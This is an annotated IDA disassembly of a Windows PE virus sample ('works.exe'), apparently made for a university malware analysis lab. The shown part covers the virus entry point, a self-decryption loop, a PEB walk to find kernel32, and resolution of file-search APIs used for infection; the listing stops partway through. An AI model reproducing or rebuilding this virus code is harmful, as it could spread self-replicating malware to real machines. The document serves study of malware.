.text:00401000 ;
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ; |      This file was generated by The Interactive Disassembler (IDA)      |
.text:00401000 ; |           Copyright (c) 2019 Hex-Rays, <support@hex-rays.com>           |
.text:00401000 ; |                      License info: 48-BABB-7E64-E2                      |
.text:00401000 ; |                     Georgia Institute of Technology                     |
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ;
.text:00401000 ; Input SHA256 : 27049F49E3F5FD800E91CDF9650FB2B2C480FA5AA020237F04E63B0FEBE1A832
.text:00401000 ; Input MD5    : BFF59357D6C60761C55BEC0FFA3BBC46
.text:00401000 ; Input CRC32  : 2F4173AD
.text:00401000
.text:00401000 ; File Name   : /nethome/pthirumal3/ECE4117/lab5/works.exe
.text:00401000 ; Format      : Portable executable for 80386 (PE)
.text:00401000 ; Imagebase   : 400000
.text:00401000 ; Timestamp   : 49C7EA12 (Mon Mar 23 19:59:14 2009)
.text:00401000 ; Section 1. (virtual address 00001000)
.text:00401000 ; Virtual size                  : 00000026 (     38.)
.text:00401000 ; Section size in file          : 00000200 (    512.)
.text:00401000 ; Offset to raw data for section: 00000400
.text:00401000 ; Flags 60000020: Text Executable Readable
.text:00401000 ; Alignment     : default
.text:00401000
.text:00401000 This is file I will be analyzing
.text:00401000
.text:00401000                 .686p
.text:00401000                 .mmx
.text:00401000                 .model flat
.text:00401000
.text:00401000 ; ===========================================================================
.text:00401000
.text:00401000 ; Segment type: Pure code
.text:00401000 ; Segment permissions: Read/Execute
.text:00401000 _text           segment para public 'CODE' use32
.text:00401000                 assume cs:_text
.text:00401000                 ;org 401000h
.text:00401000                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.text:00401000
.text:00401000 ; =============== S U B R O U T I N E =======================================
.text:00401000
.text:00401000 ; Attributes: noreturn
.text:00401000
.text:00401000                 public start
.text:00401000 start           proc near               ; DATA XREF: open_file+1B9\u2193o
.text:00401000                 push    0               ; save 0 onto stack
.text:00401002                 push    offset aHello   ; "Hello"
.text:00401007                 push    offset Hello_World
.text:0040100C                 push    0               ; save 0
.text:0040100E                 call    start_virus     ; call virus
.text:00401013                 push    0               ; uExitCode
.text:00401015                 call    ExitProcess     ; ExitProcess()
.text:00401015 start           endp
.text:00401015
.text:0040101A ; [00000006 BYTES: COLLAPSED FUNCTION MessageBoxA. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00401020 ; [00000006 BYTES: COLLAPSED FUNCTION ExitProcess. PRESS CTRL-NUMPAD+ TO EXPAND]
.text:00401026                 align 4
.text:00401028                 dd 0Eh dup(0)
.text:00401060                 db 0
.text:00401061 dword_401061    dd 0                    ; DATA XREF: .data:00403020\u2193r
.text:00401065                 db    0
.text:00401066                 db    0
.text:00401067                 db    0
.text:00401068                 db    0
.text:00401069                 db    0
.text:0040106A                 db    0
.text:0040106B                 db    0
.text:0040106C                 db    0
.text:0040106D                 db    0
.text:0040106E                 db    0
.text:0040106F                 db    0
.text:00401070                 db    0
.text:00401071                 db    0
.text:00401072                 db    0
.text:00401073                 db    0
.text:00401074                 db    0
.text:00401075                 db    0
.text:00401076                 db    0
.text:00401077                 db    0
.text:00401078                 db    0
.text:00401079                 db    0
.text:0040107A                 db    0
.text:0040107B                 db    0
.text:0040107C                 db    0
.text:0040107D                 db    0
.text:0040107E                 db    0
.text:0040107F                 db    0
.text:00401080                 db    0
.text:00401081                 db    0
.text:00401082                 db    0
.text:00401083                 db    0
.text:00401084                 db    0
.text:00401085                 db    0
.text:00401086                 db    0
.text:00401087                 db    0
.text:00401088                 db    0
.text:00401089                 db    0
.text:0040108A                 db    0
.text:0040108B                 db    0
.text:0040108C                 db    0
.text:0040108D                 db    0
.text:0040108E                 db    0
.text:0040108F                 db    0
.text:00401090                 db    0
.text:00401091                 db    0
.text:00401092                 db    0
.text:00401093                 db    0
.text:00401094                 db    0
.text:00401095                 db    0
.text:00401096                 db    0
.text:00401097                 db    0
.text:00401098                 db    0
.text:00401099                 db    0
.text:0040109A                 db    0
.text:0040109B                 db    0
.text:0040109C                 db    0
.text:0040109D                 db    0
.text:0040109E                 db    0
.text:0040109F                 db    0
.text:004010A0                 db    0
.text:004010A1                 db    0
.text:004010A2                 db    0
.text:004010A3                 db    0
.text:004010A4                 db    0
.text:004010A5                 db    0
.text:004010A6                 db    0
.text:004010A7                 db    0
.text:004010A8                 db    0
.text:004010A9                 db    0
.text:004010AA                 db    0
.text:004010AB                 db    0
.text:004010AC                 db    0
.text:004010AD                 db    0
.text:004010AE                 db    0
.text:004010AF                 db    0
.text:004010B0                 db    0
.text:004010B1                 db    0
.text:004010B2                 db    0
.text:004010B3                 db    0
.text:004010B4                 db    0
.text:004010B5                 db    0
.text:004010B6                 db    0
.text:004010B7                 db    0
.text:004010B8                 db    0
.text:004010B9                 db    0
.text:004010BA                 db    0
.text:004010BB                 db    0
.text:004010BC                 db    0
.text:004010BD                 db    0
.text:004010BE                 db    0
.text:004010BF                 db    0
.text:004010C0                 db    0
.text:004010C1                 db    0
.text:004010C2                 db    0
.text:004010C3                 db    0
.text:004010C4                 db    0
.text:004010C5                 db    0
.text:004010C6                 db    0
.text:004010C7                 db    0
.text:004010C8                 db    0
.text:004010C9                 db    0
.text:004010CA                 db    0
.text:004010CB                 db    0
.text:004010CC                 db    0
.text:004010CD                 db    0
.text:004010CE                 db    0
.text:004010CF                 db    0
.text:004010D0                 db    0
.text:004010D1                 db    0
.text:004010D2                 db    0
.text:004010D3                 db    0
.text:004010D4                 db    0
.text:004010D5                 db    0
.text:004010D6                 db    0
.text:004010D7                 db    0
.text:004010D8                 db    0
.text:004010D9                 db    0
.text:004010DA                 db    0
.text:004010DB                 db    0
.text:004010DC                 db    0
.text:004010DD                 db    0
.text:004010DE                 db    0
.text:004010DF                 db    0
.text:004010E0                 db    0
.text:004010E1                 db    0
.text:004010E2                 db    0
.text:004010E3                 db    0
.text:004010E4                 db    0
.text:004010E5                 db    0
.text:004010E6                 db    0
.text:004010E7                 db    0
.text:004010E8                 db    0
.text:004010E9                 db    0
.text:004010EA                 db    0
.text:004010EB                 db    0
.text:004010EC                 db    0
.text:004010ED                 db    0
.text:004010EE                 db    0
.text:004010EF                 db    0
.text:004010F0                 db    0
.text:004010F1                 db    0
.text:004010F2                 db    0
.text:004010F3                 db    0
.text:004010F4                 db    0
.text:004010F5                 db    0
.text:004010F6                 db    0
.text:004010F7                 db    0
.text:004010F8                 db    0
.text:004010F9                 db    0
.text:004010FA                 db    0
.text:004010FB                 db    0
.text:004010FC                 db    0
.text:004010FD                 db    0
.text:004010FE                 db    0
.text:004010FF                 db    0
.text:00401100                 db    0
.text:00401101                 db    0
.text:00401102                 db    0
.text:00401103                 db    0
.text:00401104                 db    0
.text:00401105                 db    0
.text:00401106                 db    0
.text:00401107                 db    0
.text:00401108                 db    0
.text:00401109                 db    0
.text:0040110A                 db    0
.text:0040110B                 db    0
.text:0040110C                 db    0
.text:0040110D                 db    0
.text:0040110E                 db    0
.text:0040110F                 db    0
.text:00401110                 db    0
.text:00401111                 db    0
.text:00401112                 db    0
.text:00401113                 db    0
.text:00401114                 db    0
.text:00401115                 db    0
.text:00401116                 db    0
.text:00401117                 db    0
.text:00401118                 db    0
.text:00401119                 db    0
.text:0040111A                 db    0
.text:0040111B                 db    0
.text:0040111C                 db    0
.text:0040111D                 db    0
.text:0040111E                 db    0
.text:0040111F                 db    0
.text:00401120                 db    0
.text:00401121                 db    0
.text:00401122                 db    0
.text:00401123                 db    0
.text:00401124                 db    0
.text:00401125                 db    0
.text:00401126                 db    0
.text:00401127                 db    0
.text:00401128                 db    0
.text:00401129                 db    0
.text:0040112A                 db    0
.text:0040112B                 db    0
.text:0040112C                 db    0
.text:0040112D                 db    0
.text:0040112E                 db    0
.text:0040112F                 db    0
.text:00401130                 db    0
.text:00401131                 db    0
.text:00401132                 db    0
.text:00401133                 db    0
.text:00401134                 db    0
.text:00401135                 db    0
.text:00401136                 db    0
.text:00401137                 db    0
.text:00401138                 db    0
.text:00401139                 db    0
.text:0040113A                 db    0
.text:0040113B                 db    0
.text:0040113C                 db    0
.text:0040113D                 db    0
.text:0040113E                 db    0
.text:0040113F                 db    0
.text:00401140                 db    0
.text:00401141                 db    0
.text:00401142                 db    0
.text:00401143                 db    0
.text:00401144                 db    0
.text:00401145                 db    0
.text:00401146                 db    0
.text:00401147                 db    0
.text:00401148                 db    0
.text:00401149                 db    0
.text:0040114A                 db    0
.text:0040114B                 db    0
.text:0040114C                 db    0
.text:0040114D                 db    0
.text:0040114E                 db    0
.text:0040114F                 db    0
.text:00401150                 db    0
.text:00401151                 db    0
.text:00401152                 db    0
.text:00401153                 db    0
.text:00401154                 db    0
.text:00401155                 db    0
.text:00401156                 db    0
.text:00401157                 db    0
.text:00401158                 db    0
.text:00401159                 db    0
.text:0040115A                 db    0
.text:0040115B                 db    0
.text:0040115C                 db    0
.text:0040115D                 db    0
.text:0040115E                 db    0
.text:0040115F                 db    0
.text:00401160                 db    0
.text:00401161                 db    0
.text:00401162                 db    0
.text:00401163                 db    0
.text:00401164                 db    0
.text:00401165                 db    0
.text:00401166                 db    0
.text:00401167                 db    0
.text:00401168                 db    0
.text:00401169                 db    0
.text:0040116A                 db    0
.text:0040116B                 db    0
.text:0040116C                 db    0
.text:0040116D                 db    0
.text:0040116E                 db    0
.text:0040116F                 db    0
.text:00401170                 db    0
.text:00401171                 db    0
.text:00401172                 db    0
.text:00401173                 db    0
.text:00401174                 db    0
.text:00401175                 db    0
.text:00401176                 db    0
.text:00401177                 db    0
.text:00401178                 db    0
.text:00401179                 db    0
.text:0040117A                 db    0
.text:0040117B                 db    0
.text:0040117C                 db    0
.text:0040117D                 db    0
.text:0040117E                 db    0
.text:0040117F                 db    0
.text:00401180                 db    0
.text:00401181                 db    0
.text:00401182                 db    0
.text:00401183                 db    0
.text:00401184                 db    0
.text:00401185                 db    0
.text:00401186                 db    0
.text:00401187                 db    0
.text:00401188                 db    0
.text:00401189                 db    0
.text:0040118A                 db    0
.text:0040118B                 db    0
.text:0040118C                 db    0
.text:0040118D                 db    0
.text:0040118E                 db    0
.text:0040118F                 db    0
.text:00401190                 db    0
.text:00401191                 db    0
.text:00401192                 db    0
.text:00401193                 db    0
.text:00401194                 db    0
.text:00401195                 db    0
.text:00401196                 db    0
.text:00401197                 db    0
.text:00401198                 db    0
.text:00401199                 db    0
.text:0040119A                 db    0
.text:0040119B                 db    0
.text:0040119C                 db    0
.text:0040119D                 db    0
.text:0040119E                 db    0
.text:0040119F                 db    0
.text:004011A0                 db    0
.text:004011A1                 db    0
.text:004011A2                 db    0
.text:004011A3                 db    0
.text:004011A4                 db    0
.text:004011A5                 db    0
.text:004011A6                 db    0
.text:004011A7                 db    0
.text:004011A8                 db    0
.text:004011A9                 db    0
.text:004011AA                 db    0
.text:004011AB                 db    0
.text:004011AC                 db    0
.text:004011AD                 db    0
.text:004011AE                 db    0
.text:004011AF                 db    0
.text:004011B0                 db    0
.text:004011B1                 db    0
.text:004011B2                 db    0
.text:004011B3                 db    0
.text:004011B4                 db    0
.text:004011B5                 db    0
.text:004011B6                 db    0
.text:004011B7                 db    0
.text:004011B8                 db    0
.text:004011B9                 db    0
.text:004011BA                 db    0
.text:004011BB                 db    0
.text:004011BC                 db    0
.text:004011BD                 db    0
.text:004011BE                 db    0
.text:004011BF                 db    0
.text:004011C0                 db    0
.text:004011C1                 db    0
.text:004011C2                 db    0
.text:004011C3                 db    0
.text:004011C4                 db    0
.text:004011C5                 db    0
.text:004011C6                 db    0
.text:004011C7                 db    0
.text:004011C8                 db    0
.text:004011C9                 db    0
.text:004011CA                 db    0
.text:004011CB                 db    0
.text:004011CC                 db    0
.text:004011CD                 db    0
.text:004011CE                 db    0
.text:004011CF                 db    0
.text:004011D0                 db    0
.text:004011D1                 db    0
.text:004011D2                 db    0
.text:004011D3                 db    0
.text:004011D4                 db    0
.text:004011D5                 db    0
.text:004011D6                 db    0
.text:004011D7                 db    0
.text:004011D8                 db    0
.text:004011D9                 db    0
.text:004011DA                 db    0
.text:004011DB                 db    0
.text:004011DC                 db    0
.text:004011DD                 db    0
.text:004011DE                 db    0
.text:004011DF                 db    0
.text:004011E0                 db    0
.text:004011E1                 db    0
.text:004011E2                 db    0
.text:004011E3                 db    0
.text:004011E4                 db    0
.text:004011E5                 db    0
.text:004011E6                 db    0
.text:004011E7                 db    0
.text:004011E8                 db    0
.text:004011E9                 db    0
.text:004011EA                 db    0
.text:004011EB                 db    0
.text:004011EC                 db    0
.text:004011ED                 db    0
.text:004011EE                 db    0
.text:004011EF                 db    0
.text:004011F0                 db    0
.text:004011F1                 db    0
.text:004011F2                 db    0
.text:004011F3                 db    0
.text:004011F4                 db    0
.text:004011F5                 db    0
.text:004011F6                 db    0
.text:004011F7                 db    0
.text:004011F8                 db    0
.text:004011F9                 db    0
.text:004011FA                 db    0
.text:004011FB                 db    0
.text:004011FC                 db    0
.text:004011FD                 db    0
.text:004011FE                 db    0
.text:004011FF                 db    0
.text:00401200                 dd 157h dup(?)
.text:0040175C                 db 3 dup(?)
.text:0040175F dword_40175F    dd ?                    ; DATA XREF: open_file+15E\u2193w
.text:0040175F                                         ; open_file+1B3\u2193r
.text:00401763 dword_401763    dd ?                    ; DATA XREF: open_file+16A\u2193w
.text:00401763                                         ; open_file+29F\u2193r
.text:00401767 dword_401767    dd ?                    ; DATA XREF: open_file+26D\u2193w
.text:00401767                                         ; open_file+289\u2193w ...
.text:0040176B dword_40176B    dd ?                    ; DATA XREF: open_file+216\u2193w
.text:0040176B                                         ; open_file+293\u2193r ...
.text:0040176F                 db ?
.text:00401770                 dd 3 dup(?)
.text:0040177C                 dd ?
.text:00401780                 dd 7 dup(?)
.text:0040179C                 db 3 dup(?)
.text:0040179F dword_40179F    dd ?                    ; DATA XREF: recursive_check+E\u2193r
.text:004017A3                 db ?
.text:004017A4                 dd 2 dup(?)
.text:004017AC                 db 2 dup(?)
.text:004017AE                 dd ?
.text:004017B2                 dw ?
.text:004017B4                 dd 2 dup(?)
.text:004017BC                 db ?
.text:004017BD dword_4017BD    dd ?                    ; DATA XREF: open_file+19\u2193r
.text:004017C1                 db 3 dup(?)
.text:004017C4                 dd 3 dup(?)
.text:004017D0                 db 3 dup(?)
.text:004017D3 dword_4017D3    dd ?                    ; DATA XREF: open_file+65\u2193r
.text:004017D7                 db ?
.text:004017D8                 dd 3 dup(?)
.text:004017E4                 db ?
.text:004017E5 dword_4017E5    dd ?                    ; DATA XREF: open_file+86\u2193r
.text:004017E9                 db 3 dup(?)
.text:004017EC                 dd 4 dup(?)
.text:004017FC                 db ?
.text:004017FD dword_4017FD    dd ?                    ; DATA XREF: recursive_check+8E\u2193r
.text:004017FD                                         ; recursive_check+A4\u2193r
.text:00401801                 db 3 dup(?)
.text:00401804                 dd 3 dup(?)
.text:00401810                 db 3 dup(?)
.text:00401813 dword_401813    dd ?                    ; DATA XREF: .data:00403312\u2193r
.text:00401817                 db ?
.text:00401818                 dd 4 dup(?)
.text:00401828 dword_401828    dd ?                    ; DATA XREF: .data:00403320\u2193r
.text:0040182C                 dd 2 dup(?)
.text:00401834                 db 3 dup(?)
.text:00401837                 dd ?
.text:0040183B                 db ?
.text:0040183C                 dd 2 dup(?)
.text:00401844                 db 3 dup(?)
.text:00401847                 dd ?
.text:0040184B                 db ?
.text:0040184C                 dd 2 dup(?)
.text:00401854                 db ?
.text:00401855                 dd ?
.text:00401859                 db 3 dup(?)
.text:0040185C                 dd 2 dup(?)
.text:00401864                 db 2 dup(?)
.text:00401866                 dd ?
.text:0040186A                 dw ?
.text:0040186C                 dd 3 dup(?)
.text:00401878                 db 2 dup(?)
.text:0040187A dword_40187A    dd ?                    ; DATA XREF: open_file+C7\u2193r
.text:0040187A                                         ; open_file+2F2\u2193r
.text:0040187E                 dw ?
.text:00401880                 dd 2 dup(?)
.text:00401888                 db 2 dup(?)
.text:0040188A dword_40188A    dd ?                    ; DATA XREF: open_file+D6\u2193r
.text:0040188A                                         ; open_file+E5\u2193r ...
.text:0040188E                 dw ?
.text:00401890                 dd 2 dup(?)
.text:00401898                 db 3 dup(?)
.text:0040189B                 dd ?
.text:0040189F                 db ?
.text:004018A0                 dd 2 dup(?)
.text:004018A8                 db 3 dup(?)
.text:004018AB dword_4018AB    dd ?                    ; DATA XREF: open_file+37\u2193r
.text:004018AF                 db ?
.text:004018B0                 dd 3 dup(?)
.text:004018BC                 db ?
.text:004018BD dword_4018BD    dd ?                    ; DATA XREF: recursive_check+25\u2193r
.text:004018C1                 db 3 dup(?)
.text:004018C4                 dd 3 dup(?)
.text:004018D0                 db 3 dup(?)
.text:004018D3 dword_4018D3    dd ?                    ; DATA XREF: recursive_check+6E\u2193r
.text:004018D7                 db ?
.text:004018D8                 dd 3 dup(?)
.text:004018E4 dword_4018E4    dd ?                    ; DATA XREF: recursive_check+52\u2193r
.text:004018E8                 dd 2 dup(?)
.text:004018F0                 db 2 dup(?)
.text:004018F2                 dd ?
.text:004018F6                 dw ?
.text:004018F8                 dd 0ACh dup(?)
.text:00401BA8                 db ?
.text:00401BA9 dword_401BA9    dd ?                    ; DATA XREF: open_file+21\u2193w
.text:00401BA9                                         ; open_file+5E\u2193r ...
.text:00401BAD dword_401BAD    dd ?                    ; DATA XREF: open_file+6D\u2193w
.text:00401BAD                                         ; open_file+7F\u2193r ...
.text:00401BB1 dword_401BB1    dd ?                    ; DATA XREF: open_file+8E\u2193w
.text:00401BB1                                         ; open_file+C0\u2193r ...
.text:00401BB5                 dd ?
.text:00401BB9                 dd ?
.text:00401BBD                 db 3 dup(?)
.text:00401BC0                 db ?
.text:00401BC1 dword_401BC1    dd ?                    ; DATA XREF: open_file+A7\u2193w
.text:00401BC1                                         ; open_file+115\u2193r ...
.text:00401BC5 dword_401BC5    dd ?                    ; DATA XREF: open_file+B0\u2193w
.text:00401BC5                                         ; open_file+13A\u2193r ...
.text:00401BC9 dword_401BC9    dd ?                    ; DATA XREF: open_file+FD\u2193w
.text:00401BC9                                         ; open_file:loc_40366F\u2193r
.text:00401BCD dword_401BCD    dd ?                    ; DATA XREF: open_file+27A\u2193w
.text:00401BD1 dword_401BD1    dd ?                    ; DATA XREF: open_file+F4\u2193w
.text:00401BD1                                         ; open_file+25E\u2193r ...
.text:00401BD5 dword_401BD5    dd ?                    ; DATA XREF: open_file+246\u2193w
.text:00401BD9 dword_401BD9    dd ?                    ; DATA XREF: open_file+143\u2193w
.text:00401BD9                                         ; open_file+1A5\u2193r
.text:00401BDD dword_401BDD    dd ?                    ; DATA XREF: open_file+14C\u2193w
.text:00401BE1                 db 3 dup(?)
.text:00401BE4                 db ?
.text:00401BE5 dword_401BE5    dd ?                    ; DATA XREF: random_seed\u2193r
.text:00401BE5                                         ; open_file+1CC\u2193r ...
.text:00401BE9                 db 3 dup(?)
.text:00401BEC                 db ?
.text:00401BED byte_401BED     db 3 dup(?)             ; DATA XREF: recursive_check+1E\u2193o
.text:00401BF0                 db ?
.text:00401BF1 byte_401BF1     db 3 dup(?)             ; DATA XREF: recursive_check+9D\u2193o
.text:00401BF4                 dd 5 dup(?)
.text:00401C08 dword_401C08    dd ?                    ; DATA XREF: recursive_check+B9\u2193w
.text:00401C08                                         ; open_file+12\u2193r
.text:00401C0C dword_401C0C    dd ?                    ; DATA XREF: open_file+49\u2193w
.text:00401C0C                                         ; open_file+51\u2193r ...
.text:00401C10 dword_401C10    dd ?                    ; DATA XREF: open_file+109\u2193w
.text:00401C10                                         ; open_file+10F\u2193r ...
.text:00401C14                 dd 0FBh dup(?)
.text:00401C14 _text           ends
.text:00401C14
.idata:00402000 ; Section 2. (virtual address 00002000)
.idata:00402000 ; Virtual size                  : 00000092 (    146.)
.idata:00402000 ; Section size in file          : 00000200 (    512.)
.idata:00402000 ; Offset to raw data for section: 00000600
.idata:00402000 ; Flags 40000040: Data Readable
.idata:00402000 ; Alignment     : default
.idata:00402000 ;
.idata:00402000 ; Imports from kernel32.dll
.idata:00402000 ;
.idata:00402000 ; ===========================================================================
.idata:00402000
.idata:00402000 ; Segment type: Externs
.idata:00402000 ; _idata
.idata:00402000 ; void __stdcall __noreturn ExitProcess(UINT uExitCode)
.idata:00402000                 extrn __imp_ExitProcess:dword
.idata:00402000                                         ; DATA XREF: ExitProcess\u2191r
.idata:00402000                                         ; .rdata:00402034\u2193o
.idata:00402004
.idata:00402008 ;
.idata:00402008 ; Imports from user32.dll
.idata:00402008 ;
.idata:00402008 ; int __stdcall MessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)
.idata:00402008                 extrn __imp_MessageBoxA:dword
.idata:00402008                                         ; DATA XREF: MessageBoxA\u2191r
.idata:00402008                                         ; .rdata:00402020\u2193o
.idata:0040200C
.idata:0040200C
.rdata:00402010 ; ===========================================================================
.rdata:00402010
.rdata:00402010 ; Segment type: Pure data
.rdata:00402010 ; Segment permissions: Read
.rdata:00402010 _rdata          segment para public 'DATA' use32
.rdata:00402010                 assume cs:_rdata
.rdata:00402010                 ;org 402010h
.rdata:00402010                 db 54h
.rdata:00402011                 db 20h
.rdata:00402012                 db    0
.rdata:00402013                 db    0
.rdata:00402014                 dd 0                    ; Time stamp
.rdata:00402018                 dd 0                    ; Forwarder Chain
.rdata:0040201C                 dd rva aUser32Dll       ; DLL Name
.rdata:00402020                 dd rva __imp_MessageBoxA ; Import Address Table
.rdata:00402024                 db 4Ch
.rdata:00402025                 db 20h
.rdata:00402026                 db    0
.rdata:00402027                 db    0
.rdata:00402028                 dd 0                    ; Time stamp
.rdata:0040202C                 dd 0                    ; Forwarder Chain
.rdata:00402030 ; ---------------------------------------------------------------------------
.rdata:00402030                 test    [eax], ah       ; DLL Name
.rdata:00402030 ; ---------------------------------------------------------------------------
.rdata:00402032                 db    0
.rdata:00402033                 db    0
.rdata:00402034                 dd rva __imp_ExitProcess ; Import Address Table
.rdata:00402038                 db    0
.rdata:00402039                 db    0
.rdata:0040203A                 db    0
.rdata:0040203B                 db    0
.rdata:0040203C                 db    0
.rdata:0040203D                 db    0
.rdata:0040203E                 db    0
.rdata:0040203F                 db    0
.rdata:00402040                 db    0
.rdata:00402041                 db    0
.rdata:00402042                 db    0
.rdata:00402043                 db    0
.rdata:00402044                 db    0
.rdata:00402045                 db    0
.rdata:00402046                 db    0
.rdata:00402047                 db    0
.rdata:00402048                 db    0
.rdata:00402049                 db    0
.rdata:0040204A                 db    0
.rdata:0040204B                 db    0
.rdata:0040204C ;
.rdata:0040204C ; Import names for kernel32.dll
.rdata:0040204C ;
.rdata:0040204C                 dd rva word_402076
.rdata:00402050                 dd 0
.rdata:00402054 ;
.rdata:00402054 ; Import names for user32.dll
.rdata:00402054 ;
.rdata:00402054                 dd rva word_40205C
.rdata:00402058                 dd 0
.rdata:0040205C word_40205C     dw 1B1h                 ; DATA XREF: .rdata:00402054\u2191o
.rdata:0040205E                 db 'MessageBoxA',0
.rdata:0040206A aUser32Dll      db 'user32.dll',0       ; DATA XREF: .rdata:0040201C\u2191o
.rdata:00402075                 align 2
.rdata:00402076 word_402076     dw 9Bh                  ; DATA XREF: .rdata:0040204C\u2191o
.rdata:00402078                 db 'ExitProcess',0
.rdata:00402084 aKernel32Dll    db 'kernel32.dll',0
.rdata:00402091                 align 1000h
.rdata:00402091 _rdata          ends
.rdata:00402091
.data:00403000 ; Section 3. (virtual address 00003000)
.data:00403000 ; Virtual size                  : 00000CAA (   3242.)
.data:00403000 ; Section size in file          : 00000E9D (   3741.)
.data:00403000 ; Offset to raw data for section: 00000800
.data:00403000 ; Flags C0000040: Data Readable Writable
.data:00403000 ; Alignment     : default
.data:00403000 ; ===========================================================================
.data:00403000
.data:00403000 ; Segment type: Pure data
.data:00403000 ; Segment permissions: Read/Write
.data:00403000 _data           segment para public 'DATA' use32
.data:00403000                 assume cs:_data
.data:00403000                 ;org 403000h
.data:00403000 Hello_World     db  48h ; H             ; DATA XREF: start+7\u2191o
.data:00403001                 db  65h ; e
.data:00403002                 db  6Ch ; l
.data:00403003                 db  6Ch ; l
.data:00403004                 db  6Fh ; o
.data:00403005                 db  2Ch ; ,
.data:00403006                 db  20h
.data:00403007                 db  57h ; W
.data:00403008                 db  6Fh ; o
.data:00403009                 db  72h ; r
.data:0040300A                 db  6Ch ; l
.data:0040300B                 db  64h ; d
.data:0040300C                 db  21h ; !
.data:0040300D                 db    0
.data:0040300E aHello          db 'Hello',0            ; DATA XREF: start+2\u2191o
.data:00403014 ; ---------------------------------------------------------------------------
.data:00403014
.data:00403014 start_virus:                            ; CODE XREF: start+E\u2191p
.data:00403014                 call    $+5             ; Call the next instruction
.data:00403019                 pop     ebp             ; restore ebp
.data:0040301A                 sub     ebp, 401005h    ; subtract 401005h from ebp
.data:00403020                 cmp     ss:dword_401061[ebp], 0 ; Check the XOR cipher key
.data:00403027                 jnz     short loc_40302B ; Key mismatch so jump to decryption loop
.data:00403029                 jmp     short virus_body ; Key matched so jump to virus body
.data:0040302B ; ---------------------------------------------------------------------------
.data:0040302B
.data:0040302B loc_40302B:                             ; CODE XREF: .data:00403027\u2191j
.data:0040302B                 mov     ecx, 0C31h      ; ecx = 0C31h = size of data to be decrypted
.data:00403030                 lea     esi, [ebp+401065h] ; esi = addr of ebp+401065h
.data:00403036                 mov     edi, esi        ; edi = esi
.data:00403038
.data:00403038 decryption_loop:                        ; CODE XREF: .data:00403071\u2193j
.data:00403038                 lodsb                   ; start of random 32 bit generator
.data:00403039                 push    eax             ; save eax onto stack
.data:0040303A                 push    ecx             ; save ecx onto stack
.data:0040303B                 mov     eax, [ebp+401061h] ; eax = key for decryption / encryption
.data:00403041                 xor     edx, edx        ; edx = 0
.data:00403043                 mov     ecx, 1F31Dh     ; ecx = 1F31Dh
.data:00403048                 div     ecx             ; randomize eax using the random value and 1F31Dh
.data:0040304A                 mov     ecx, eax        ; ecx = random number generate
.data:0040304C                 mov     eax, 41A7h      ; eax = 41A7h
.data:00403051                 mul     edx             ; eax * (remainder of the previous division)
.data:00403053                 mov     edx, ecx        ;  edx = ecx
.data:00403055                 mov     ecx, eax        ; ecx = result of division by the remainder of the random value
.data:00403057                 mov     eax, 0B14h      ; eax = 0B14h
.data:0040305C                 mul     edx             ; eax * edx
.data:0040305E                 sub     ecx, eax        ; ecx - (eax*edx)
.data:00403060                 xor     edx, edx        ; edx = 0
.data:00403062                 mov     eax, ecx        ; eax = ecx
.data:00403064                 mov     [ebp+401061h], ecx ; save key
.data:0040306A                 mov     edx, eax        ; edx = eax
.data:0040306C                 pop     ecx             ; restore ecx
.data:0040306D                 pop     eax             ; restore eax
.data:0040306E                 xor     al, dl          ; xor the byte
.data:00403070                 stosb                   ; save byte
.data:00403071                 loop    decryption_loop
.data:00403073                 jmp     short virus_body
.data:00403073 ; ---------------------------------------------------------------------------
.data:00403075                 db  37h ; 7
.data:00403076                 db  92h ; \92
.data:00403077                 db  10h
.data:00403078                 db  3Ch ; <
.data:00403079 ; ---------------------------------------------------------------------------
.data:00403079
.data:00403079 virus_body:                             ; CODE XREF: .data:00403029\u2191j
.data:00403079                                         ; .data:00403073\u2191j
.data:00403079                 push    esi             ; save esi onto stack
.data:0040307A                 xor     eax, eax        ; eax = 0
.data:0040307C                 mov     eax, fs:[eax+30h] ; eax has the address of the Process Environment Block (PEB)
.data:00403080                 test    eax, eax        ; Verify the PEB addr
.data:00403082                 js      short kernel32_9x ; Failed so find kernel32_9x
.data:00403084                 mov     eax, [eax+0Ch]  ; eax has the addr of PEB_LDR_DATA *Ldr
.data:00403087                 mov     esi, [eax+1Ch]  ; esi has LIST_ENTRY InInitializationOrderModuleList
.data:0040308A                 lodsd                   ; Load the entry for kernel32.dll
.data:0040308B                 mov     eax, [eax+8]    ; Kernel32.dll module base address
.data:0040308E                 jmp     short loc_403099
.data:00403090 ; ---------------------------------------------------------------------------
.data:00403090
.data:00403090 kernel32_9x:                            ; CODE XREF: .data:00403082\u2191j
.data:00403090                 mov     eax, [eax+34h]  ; offset ??
.data:00403093                 lea     eax, [eax+7Ch]  ; eax + 7C to stay in signed byte range
.data:00403096                 mov     eax, [eax+3Ch]  ; kernel32.dll base addr
.data:00403099
.data:00403099 loc_403099:                             ; CODE XREF: .data:0040308E\u2191j
.data:00403099                 pop     esi             ; ESI = 00403CAA
.data:0040309A                 mov     [ebp+401BB9h], eax ; Move the base to location 00403BCDh
.data:004030A0                 lea     esi, [ebp+401770h] ; Load Library
.data:004030A6                 call    Get_Func_Addr
.data:004030AB                 mov     [ebp+40177Ch], eax ; save LoadLibrary address
.data:004030B1                 mov     eax, [ebp+401BB9h] ; Kernel32.dll
.data:004030B7                 lea     esi, [ebp+401801h] ; GetCurrentProcess
.data:004030BD                 call    Get_Func_Addr
.data:004030C2                 mov     [ebp+401813h], eax ; save GetCurrentProcess base addr
.data:004030C8                 mov     eax, [ebp+401BB9h] ; Kernel32.dll
.data:004030CE                 lea     esi, [ebp+401817h] ; SetPriorityClass
.data:004030D4                 call    Get_Func_Addr
.data:004030D9                 mov     [ebp+401828h], eax ; save SetPriorityClass base addr
.data:004030DF                 mov     eax, [ebp+401BB9h] ; Kernel32.dll
.data:004030E5                 lea     esi, [ebp+4018AFh] ; FindFirstFile
.data:004030EB                 call    Get_Func_Addr
.data:004030F0                 mov     [ebp+4018BDh], eax ; save FindFirstFile base address
.data:004030F6                 mov     eax, [ebp+401BB9h] ; Kernel32.dll
.data:004030FC                 lea     esi, [ebp+4017E9h] ; SetCurrentDirectory
.data:00403102                 call    Get_Func_Addr
.data:00403107                 mov     [ebp+4017FDh], eax ; save SetCurrentDirectory base addr
.data:0040310D                 mov     eax, [ebp+401BB9h] ; Kernel32.dll
